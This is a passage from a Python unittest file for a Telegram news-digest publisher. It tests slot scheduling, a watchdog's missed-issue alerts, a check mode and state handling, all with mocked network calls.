        self.assertEqual((sost["posledniy_slot"], sost["posledniy_sbor"]), ("2026-11-11T02:00:00Z", None))

    def test_sobytie_bez_vremeni_stroka_uhodit_slot_ne_pishetsya(self):
        bez = self.papka / "sobytie.json"
        dannye = json.loads(SOBYTIE.read_text(encoding="utf-8"))
        del dannye["pull_request"]["created_at"]
        for soderzhimoe in (json.dumps(dannye), "не json"):
            with self.subTest(soderzhimoe=soderzhimoe[:10]):
                bez.write_text(soderzhimoe, encoding="utf-8")
                kod, telegram, err = self.komanda("sboj", "--prichina-iz", self.prichina("сбор публикатора не удался\n"),
                                                  "--slot-iz-zayavki", str(bez))
                self.assertEqual(kod, 0, err)
                self.assertEqual(telegram.tela(), [{"chat_id": KANAL,
                                                    "text": "⚠️ Выпуск 17:00 не собран: не удалось перепроверить "
                                                            "новости перед публикацией"}])
                self.assertIn("слот не записан", err)
                self.assertEqual(json.loads(self.sost.read_text(encoding="utf-8")), self.prezhnee)

    def test_stroka_ne_ushla_slot_vse_ravno_pishetsya(self):
        telegram = Telegram(http_oshibka(403, {"ok": False, "error_code": 403, "description": "Forbidden"}))
        with contextlib.redirect_stderr(io.StringIO()), mock.patch.object(publikaciya, "_soedinenie", telegram), \
                mock.patch.object(publikaciya, "_pauza"):
            kod = publikaciya.sboj_iz_fayla(Path(self.prichina("сбор публикатора не удался\n")), sobytie=SOBYTIE)
        self.assertEqual(kod, 1)
        self.assertEqual(sostoyanie.zagruzit(self.sost)["posledniy_slot"], "2026-11-11T02:00:00Z")

    def test_sostoyanie_ne_chitaetsya_stroka_uhodit_kod_1(self):
        self.sost.write_text("{", encoding="utf-8")
        kod, telegram, err = self.komanda("sboj", "--prichina-iz", self.prichina("сбор публикатора не удался\n"),
                                          "--slot-iz-zayavki", str(SOBYTIE))
        self.assertEqual(kod, 1)
        self.assertEqual(len(telegram.tela()), 1)
        self.assertIn("слот не записан", err)
        self.assertEqual(self.sost.read_text(encoding="utf-8"), "{")

    def test_bez_flaga_sostoyanie_ne_trogaetsya(self):
        kod, _, err = self.komanda("sboj", "--prichina-iz", self.prichina("сбор публикатора не удался\n"))
        self.assertEqual(kod, 0, err)
        self.assertEqual(json.loads(self.sost.read_text(encoding="utf-8")), self.prezhnee)


def zayavka_rest(vetka="claude/vypusk-2026-11-11T02-07-00Z", sozdana="2026-11-11T02:15:00Z",
                 repo="egor/news-ai", baza="egor/news-ai") -> dict:
    """Заявка в виде ответа REST GitHub pulls."""
    return {"number": 7, "state": "closed", "created_at": sozdana,
            "head": {"ref": vetka, "repo": {"full_name": repo}}, "base": {"ref": "main", "repo": {"full_name": baza}}}


STOROZH_SEYCHAS = datetime(2026, 11, 11, 2, 50, tzinfo=timezone.utc)


class Storozh(unittest.TestCase):
    """`storozh --zayavki <файл>`: время — 09:50 по Бангкоку (окно слота 09:00 закрылось в 09:40),
    судимый слот 09:00 = 02:00 UTC."""

    komanda = SbojINesohraneno.komanda

    def setUp(self):
        SbojINesohraneno.setUp(self)
        self.sostoyanie = self.papka / "sostoyanie.json"
        zaplatka = mock.patch.dict(os.environ, {"NEWSAI_SOSTOYANIE": str(self.sostoyanie)})
        zaplatka.start()
        self.addCleanup(zaplatka.stop)
        zaplatka = mock.patch.object(publikaciya, "seychas", return_value=STOROZH_SEYCHAS)
        zaplatka.start()
        self.addCleanup(zaplatka.stop)

    def zapusk(self, zayavki, posledniy_slot=None):
        if posledniy_slot is not None:
            self.sostoyanie.write_text(json.dumps({"posledniy_slot": posledniy_slot}), encoding="utf-8")
        put = self.papka / "zayavki.json"
        put.write_text(json.dumps(zayavki), encoding="utf-8")
        return self.komanda("storozh", "--zayavki", str(put))

    def test_net_ni_slota_ni_zayavki_stroka_sboya(self):
        kod, telegram, err = self.zapusk([], posledniy_slot="2026-11-10T18:00:00Z")
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{"chat_id": KANAL, "text": "⚠️ Выпуск 09:00 не собран: агент не прислал выпуск"}])
        self.assertEqual(err, "newsai sboj: причина строки сбоя: заявка агента не пришла\n")

    def test_pervyy_raz_bez_sostoyaniya_tozhe_stroka(self):
        kod, telegram, err = self.zapusk([])
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{"chat_id": KANAL, "text": "⚠️ Выпуск 09:00 не собран: агент не прислал выпуск"}])

    def test_slot_obrabotan_molchit(self):
        kod, telegram, err = self.zapusk([], posledniy_slot="2026-11-11T02:00:00Z")
        self.assertEqual((kod, telegram.tela()), (0, []), err)

    def test_vcherashniy_tot_zhe_chas_ne_schitaetsya(self):
        kod, telegram, _ = self.zapusk([], posledniy_slot="2026-11-10T02:00:00Z")
        self.assertEqual(len(telegram.tela()), 1)

    def test_zayavka_k_slotu_est_molchit(self):
        kod, telegram, err = self.zapusk([zayavka_rest()], posledniy_slot="2026-11-10T18:00:00Z")
        self.assertEqual((kod, telegram.tela()), (0, []), err)

    def test_ne_ta_zayavka_ne_zaglushaet(self):
        for z in (zayavka_rest(sozdana="2026-11-11T01:59:59Z"),
                  zayavka_rest(vetka="fix/kod"),
                  zayavka_rest(repo="chuzhoy/news-ai")):
            with self.subTest(z=z):
                kod, telegram, err = self.zapusk([z], posledniy_slot="2026-11-10T18:00:00Z")
                self.assertEqual(kod, 0, err)
                self.assertEqual(len(telegram.tela()), 1)

    def test_zayavka_posle_okna_ne_zaglushaet(self):
        with mock.patch.object(publikaciya, "seychas",
                               return_value=datetime(2026, 11, 11, 2, 40, tzinfo=timezone.utc)):
            kod, telegram, err = self.zapusk([zayavka_rest(sozdana="2026-11-11T02:40:00Z")],
                                             posledniy_slot="2026-11-10T18:00:00Z")
            self.assertEqual(kod, 0, err)
            self.assertEqual(telegram.tela(), [{"chat_id": KANAL,
                                                "text": "⚠️ Выпуск 09:00 не собран: агент не прислал выпуск"}])
            kod, telegram, err = self.zapusk([zayavka_rest(sozdana="2026-11-11T02:39:59Z")],
                                             posledniy_slot="2026-11-10T18:00:00Z")
            self.assertEqual((kod, telegram.tela()), (0, []), err)

    def test_spisok_zayavok_ne_chitaetsya_kod_2_bez_otpravki(self):
        put = self.papka / "zayavki.json"
        put.write_text("{не json", encoding="utf-8")
        kod, telegram, _ = self.komanda("storozh", "--zayavki", str(put))
        self.assertEqual((kod, telegram.tela()), (2, []))


class StorozhKakoySlotSudit(unittest.TestCase):
    """Р70: сторож судит последний слот, чьё окно закрылось к запуску; расписание GitHub опаздывает
    (13.11: 23:52, 09:57, 18:02 UTC)."""

    komanda = SbojINesohraneno.komanda
    setUp = Storozh.setUp
    zapusk = Storozh.zapusk

    def v(self, *kogda):
        """Подменить часы сторожа до конца теста."""
        zaplatka = mock.patch.object(publikaciya, "seychas", return_value=datetime(*kogda, tzinfo=timezone.utc))
        zaplatka.start()
        self.addCleanup(zaplatka.stop)

    def test_zapusk_18_02_sudit_17_00(self):
        self.v(2026, 11, 11, 18, 2)
        kod, telegram, err = self.zapusk([], posledniy_slot="2026-11-11T02:00:00Z")
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{"chat_id": KANAL, "text": "⚠️ Выпуск 17:00 не собран: агент не прислал выпуск"}])

    def test_zapusk_18_02_zayavka_slota_01_ne_zaglushaet(self):
        self.v(2026, 11, 11, 18, 2)
        kod, telegram, err = self.zapusk([zayavka_rest(sozdana="2026-11-11T18:01:00Z")],
                                         posledniy_slot="2026-11-11T02:00:00Z")
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{"chat_id": KANAL, "text": "⚠️ Выпуск 17:00 не собран: агент не прислал выпуск"}])

    def test_zapusk_18_02_zayavka_slota_17_zaglushaet(self):
        self.v(2026, 11, 11, 18, 2)
        kod, telegram, err = self.zapusk([zayavka_rest(sozdana="2026-11-11T10:15:00Z")],
                                         posledniy_slot="2026-11-11T02:00:00Z")
        self.assertEqual((kod, telegram.tela()), (0, []), err)

    def test_predydushchiy_slot_obrabotan_v_otkrytom_okne_tishina(self):
        for kogda, posledniy in (((2026, 11, 11, 18, 2), "2026-11-11T10:00:00Z"),
                                 ((2026, 11, 11, 2, 5), "2026-11-10T18:00:00Z")):
            with self.subTest(kogda=kogda):
                self.v(*kogda)
                kod, telegram, err = self.zapusk([], posledniy_slot=posledniy)
                self.assertEqual((kod, telegram.tela()), (0, []), err)

    def test_rovno_plyus_40_minut_i_pozzhe_sudit_etot_slot(self):
        for kogda in ((2026, 11, 11, 18, 40), (2026, 11, 11, 18, 41), (2026, 11, 12, 1, 59, 59)):
            with self.subTest(kogda=kogda):
                self.v(*kogda)
                kod, telegram, err = self.zapusk([], posledniy_slot="2026-11-11T10:00:00Z")
                self.assertEqual(kod, 0, err)
                self.assertEqual(telegram.tela(), [{"chat_id": KANAL,
                                                    "text": "⚠️ Выпуск 01:00 не собран: агент не прислал выпуск"}])
                kod, telegram, err = self.zapusk([], posledniy_slot="2026-11-11T18:00:00Z")
                self.assertEqual((kod, telegram.tela()), (0, []), err)

    def test_za_sekundu_do_konca_okna_proshlyy_slot(self):
        self.v(2026, 11, 11, 18, 39, 59)
        kod, telegram, err = self.zapusk([], posledniy_slot="2026-11-11T10:00:00Z")
        self.assertEqual((kod, telegram.tela()), (0, []), err)

    def test_zapusk_09_57_sudit_09_00(self):
        self.v(2026, 11, 11, 9, 57)
        kod, telegram, err = self.zapusk([], posledniy_slot="2026-11-10T18:00:00Z")
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{"chat_id": KANAL, "text": "⚠️ Выпуск 09:00 не собран: агент не прислал выпуск"}])
        kod, telegram, err = self.zapusk([], posledniy_slot="2026-11-11T02:00:00Z")
        self.assertEqual((kod, telegram.tela()), (0, []), err)


class StorozhRezhimProverki(unittest.TestCase):
    """Р72: в режиме проверки сторож молчит — код 0, строка о режиме в stdout, состояние и заявки не
    читаются, в канал ничего. Включено только ровно «1»."""

    setUp = Storozh.setUp

    def zapusk_s_vyvodom(self, zayavki_tekst: str, sostoyanie_tekst: str | None = None):
        if sostoyanie_tekst is not None:
            self.sostoyanie.write_text(sostoyanie_tekst, encoding="utf-8")
        put = self.papka / "zayavki.json"
        put.write_text(zayavki_tekst, encoding="utf-8")
        telegram = Telegram()
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err), \
                mock.patch.object(publikaciya, "_soedinenie", telegram), mock.patch.object(publikaciya, "_pauza"):
            kod = tochka.main(["storozh", "--zayavki", str(put)])
        return kod, telegram, out.getvalue(), err.getvalue()

    def test_vklyuchen_tishina_dazhe_pri_nechitaemom_spiske(self):
        with mock.patch.dict(os.environ, {"NEWSAI_REZHIM_PROVERKI": "1"}):
            for zayavki, sost in (("[]", json.dumps({"posledniy_slot": "2026-11-10T18:00:00Z"})),
                                  ("{не json", "{"),
                                  ("{не json", None)):
                with self.subTest(zayavki=zayavki, sost=sost):
                    kod, telegram, out, err = self.zapusk_s_vyvodom(zayavki, sost)
                    self.assertEqual((kod, telegram.tela(), telegram.soedineniya), (0, [], []))
                    self.assertEqual((out, err), ("режим проверки — сторож молчит\n", ""))

    def test_ne_odin_kak_bez_rezhima(self):
        for znachenie in ("0", "", " 1", "true", None):
            with self.subTest(znachenie=znachenie):
                with mock.patch.dict(os.environ):
                    if znachenie is None:
                        os.environ.pop("NEWSAI_REZHIM_PROVERKI", None)
                    else:
                        os.environ["NEWSAI_REZHIM_PROVERKI"] = znachenie
                    kod, telegram, out, err = self.zapusk_s_vyvodom(
                        "[]", json.dumps({"posledniy_slot": "2026-11-10T18:00:00Z"}))
                    self.assertEqual(kod, 0, err)
                    self.assertEqual(telegram.tela(), [{"chat_id": KANAL,
                                                        "text": "⚠️ Выпуск 09:00 не собран: агент не прислал выпуск"}])
                    self.assertEqual(out, "")
                    kod, telegram, _, _ = self.zapusk_s_vyvodom("{не json")
                    self.assertEqual((kod, telegram.tela()), (2, []))


def s_rezhimom(znachenie: str | None):
    """Окружение с NEWSAI_REZHIM_PROVERKI = znachenie; None — переменной нет."""
    zaplatka = mock.patch.dict(os.environ)
    zaplatka.start()
    if znachenie is None:
        os.environ.pop("NEWSAI_REZHIM_PROVERKI", None)
    else:
        os.environ["NEWSAI_REZHIM_PROVERKI"] = znachenie
    return zaplatka


ZNACHENIYA_VYKL = ("0", "", None)


class OpublikovatRezhimProverki(SFaylami):
    """Р72, `opublikovat` в процессе: в режиме проверки выпуск, пустой выпуск, обрыв и файл сбоя не
    пишут posledniy_slot; период, увиденное и вышедшее — как без режима."""

    PREZHNIY_SLOT = "2026-11-10T18:00:00Z"

    def setUp(self):
        super().setUp()
        prezhnee = sostoyanie.pustoe()
        prezhnee["posledniy_slot"] = self.PREZHNIY_SLOT
        sostoyanie.sohranit(prezhnee, self.sost)

    def rezhim(self, znachenie: str | None) -> None:
        self.addCleanup(s_rezhimom(znachenie).stop)

    def test_vypusk_ne_pishet_slot(self):
        self.rezhim("1")
        kod, out, err, telegram = self.zapusk()
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), OZHIDAEMYE_ZAPROSY)
        self.assertEqual(err, "newsai opublikovat: режим проверки — слот не отмечается\n")
        self.assertEqual(out.strip(), "отправлено сообщений: 7")
        sost = sostoyanie.zagruzit(self.sost)
        self.assertEqual(sost["posledniy_slot"], "2026-11-10T18:00:00Z")
        self.assertEqual(sost["posledniy_sbor"], "2026-11-11T01:07:00Z")
        self.assertEqual(len(sost["opublikovannye"]), 8)
        self.assertIs(sost["github_obhod"], True)
        self.assertIn("https://simonwillison.net/2026/Nov/10/fixed-typo/", sost["vidennye"])

    def test_pustoy_vypusk_ne_pishet_slot(self):
        self.rezhim("1")
        self.svoy_vypusk({"krupnye": [], "sayty": [], "x": [], "dengi": [], "github": []})
        kod, out, _, telegram = self.zapusk()
        self.assertEqual((kod, len(telegram.zaprosy)), (0, 1))
        self.assertEqual(out.strip(), "выпуск пустой — отправлена служебная строка сбора")
        sost = sostoyanie.zagruzit(self.sost)
        self.assertEqual((sost["posledniy_slot"], sost["posledniy_sbor"]),
                         ("2026-11-10T18:00:00Z", "2026-11-11T01:07:00Z"))
        self.assertIn(URL_CODEX, sost["vidennye"])

    def test_obryv_ne_pishet_slot(self):
        self.rezhim("1")
        telegram = Telegram(Telegram.ok(), http_oshibka(400, {"ok": False, "error_code": 400,
                                                              "description": "Bad Request: chat not found"}))
        kod, _, err, _ = self.zapusk(telegram)
        self.assertEqual(kod, 1)
        self.assertEqual(telegram.tela()[2], {
            "chat_id": KANAL,
            "text": "⚠️ Тестовый выпуск 09:20 отправлен не полностью — Telegram не принял сообщение"})
        self.assertEqual(len(telegram.zaprosy), 3)
        sost = sostoyanie.zagruzit(self.sost)
        self.assertEqual([p["url"] for p in sost["opublikovannye"]], [URL_OPUS])
        self.assertEqual((sost["posledniy_slot"], sost["posledniy_sbor"]), ("2026-11-10T18:00:00Z", None))

    def test_fayl_sboya_ne_pishet_slot(self):
        self.rezhim("1")
        os.environ["NEWSAI_VYPUSK"] = str(self.papka / "vypuska-net.json")
        os.environ["NEWSAI_PROGON"] = str(self.papka / "progona-net.json")
        self.fayl_sboya({"prichina": "сбор упал"})
        kod, out, err, telegram = self.zapusk()
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{"chat_id": KANAL,
                                            "text": "⚠️ Тестовый выпуск 09:20 не собран: сбор новостей упал"}])
        self.assertEqual(err, "newsai opublikovat: файл сбоя, причина: сбор упал\n"
                              "newsai opublikovat: режим проверки — слот не отмечается\n")
        self.assertEqual(out.strip(), "отправлена строка сбоя")
        sost = sostoyanie.zagruzit(self.sost)
        self.assertEqual((sost["posledniy_slot"], sost["posledniy_sbor"]), ("2026-11-10T18:00:00Z", None))

    def test_vyklyuchen_pishet_slot(self):
        for znachenie in ZNACHENIYA_VYKL:
            for vid in ("vypusk", "pustoy", "obryv", "sboj"):
                with self.subTest(znachenie=znachenie, vid=vid):
                    zaplatka = s_rezhimom(znachenie)
                    try:
                        prezhnee = sostoyanie.pustoe()
                        prezhnee["posledniy_slot"] = self.PREZHNIY_SLOT
                        sostoyanie.sohranit(prezhnee, self.sost)
                        (self.papka / "sboj.json").unlink(missing_ok=True)
                        os.environ["NEWSAI_VYPUSK"] = str(VYPUSK)
                        os.environ["NEWSAI_PROGON"] = str(PROGON)
                        telegram = None
                        if vid == "pustoy":
                            self.svoy_vypusk({"krupnye": [], "sayty": [], "x": [], "dengi": [], "github": []})
                        elif vid == "obryv":
                            telegram = Telegram(Telegram.ok(), http_oshibka(400, {"ok": False, "error_code": 400,
                                                                                  "description": "Bad Request"}))
                        elif vid == "sboj":
                            os.environ["NEWSAI_VYPUSK"] = str(self.papka / "vypuska-net.json")
                            self.fayl_sboya({"prichina": "сбор упал"})
                        kod, _, err, _ = self.zapusk(telegram)
                        self.assertEqual(kod, 1 if vid == "obryv" else 0, err)
                        self.assertNotIn("режим проверки", err)
                        self.assertEqual(sostoyanie.zagruzit(self.sost)["posledniy_slot"], "2026-11-11T02:00:00Z")
                    finally:
                        zaplatka.stop()


class SbojSlotIzZayavkiRezhimProverki(unittest.TestCase):
    """Р72, `sboj --slot-iz-zayavki` в режиме проверки: строка уходит со слотом открытия заявки,
    состояние не читается и не пишется."""

    komanda = SbojINesohraneno.komanda
    prichina = SbojINesohraneno.prichina
    setUp = SbojSlotIzZayavki.setUp

    def test_rezhim_stroka_uhodit_slot_prezhniy(self):
        self.addCleanup(s_rezhimom("1").stop)
        kod, telegram, err = self.komanda("sboj", "--prichina-iz", self.prichina("сбор публикатора не удался\n"),
                                          "--slot-iz-zayavki", str(SOBYTIE))
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{"chat_id": KANAL,
                                            "text": "⚠️ Тестовый выпуск 09:15 не собран: не удалось перепроверить "
                                                    "новости перед публикацией"}])
        self.assertEqual(err, "newsai sboj: режим проверки — слот не записан\n"
                              "newsai sboj: причина строки сбоя: сбор публикатора не удался\n")
        self.assertEqual(json.loads(self.sost.read_text(encoding="utf-8")), self.prezhnee)

    def test_rezhim_sostoyanie_ne_chitaetsya_kod_0(self):
        self.addCleanup(s_rezhimom("1").stop)
        self.sost.write_text("{", encoding="utf-8")
        kod, telegram, err = self.komanda("sboj", "--prichina-iz", self.prichina("заявка не прошла проверку: схема\n"),
                                          "--slot-iz-zayavki", str(SOBYTIE))
        self.assertEqual((kod, len(telegram.tela())), (0, 1), err)
        self.assertEqual(self.sost.read_text(encoding="utf-8"), "{")

    def test_vyklyuchen_slot_pishetsya(self):
        for znachenie in ZNACHENIYA_VYKL:
            with self.subTest(znachenie=znachenie):
                zaplatka = s_rezhimom(znachenie)
                try:
                    self.sost.write_text(json.dumps(self.prezhnee), encoding="utf-8")
                    kod, telegram, err = self.komanda("sboj", "--prichina-iz",
                                                      self.prichina("сбор публикатора не удался\n"),
                                                      "--slot-iz-zayavki", str(SOBYTIE))
                    self.assertEqual((kod, len(telegram.tela())), (0, 1), err)
                    self.assertEqual(json.loads(self.sost.read_text(encoding="utf-8")),
                                     {**self.prezhnee, "posledniy_slot": "2026-11-11T02:00:00Z"})
                finally:
                    zaplatka.stop()


class TekstSboya(unittest.TestCase):
    def test_tekst_so_slotom(self):
        for kogda, ozhidaem in (((2026, 11, 11, 18, 20), "⚠️ Выпуск 01:00 не собран: ни один источник не ответил"),
                                ((2026, 11, 11, 10, 5), "⚠️ Выпуск 17:00 не собран: ни один источник не ответил")):
            with self.subTest(kogda=kogda):
                self.assertEqual(publikaciya.tekst_sboya("не ответил ни один источник",
                                                         datetime(*kogda, tzinfo=timezone.utc)), ozhidaem)

    def test_rezhim_proverki_testovyy_vypusk_so_vremenem(self):
        """Р72, С85: в режиме проверки — «Тестовый выпуск ЧЧ:ММ» по Бангкоку; выключен — слот."""
        kogda = datetime(2026, 11, 11, 7, 20, tzinfo=timezone.utc)
        zaplatka = s_rezhimom("1")
        try:
            self.assertEqual(publikaciya.tekst_sboya("сбор упал", kogda),
                             "⚠️ Тестовый выпуск 14:20 не собран: сбор новостей упал")
            self.assertEqual(publikaciya.tekst_sboya("я" * 5000, datetime(2026, 11, 11, 17, 59, tzinfo=timezone.utc)),
                             "⚠️ Тестовый выпуск 00:59 не собран")
        finally:
            zaplatka.stop()
        for znachenie in ZNACHENIYA_VYKL:
            with self.subTest(znachenie=znachenie):
                zaplatka = s_rezhimom(znachenie)
                try:
                    self.assertEqual(publikaciya.tekst_sboya("сбор упал", kogda),
                                     "⚠️ Выпуск 09:00 не собран: сбор новостей упал")
                finally:
                    zaplatka.stop()

    def test_dlinnaya_neizvestnaya_prichina_v_kanal_ne_idet(self):
        kogda = datetime(2026, 11, 11, 10, 5, tzinfo=timezone.utc)
        self.assertEqual(publikaciya.tekst_sboya("я" * 5000, kogda), "⚠️ Выпуск 17:00 не собран")
        self.assertEqual(publikaciya.zapros_sboya("заявка не прошла проверку: схема, ссылки", kogda),
                         {"chat_id": KANAL, "text": "⚠️ Выпуск 17:00 не собран: выпуск не прошёл проверку"})


if __name__ == "__main__":
    unittest.main()
